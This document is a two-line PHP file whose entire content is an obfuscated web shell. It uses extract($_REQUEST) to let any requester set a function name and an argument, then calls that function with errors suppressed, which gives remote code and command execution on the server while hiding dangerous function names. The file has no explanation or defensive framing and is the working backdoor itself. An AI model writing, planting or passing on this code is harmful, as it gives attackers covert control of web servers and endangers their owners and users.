<?php
extract($_REQUEST) && @$except(stripslashes($request)) && exit;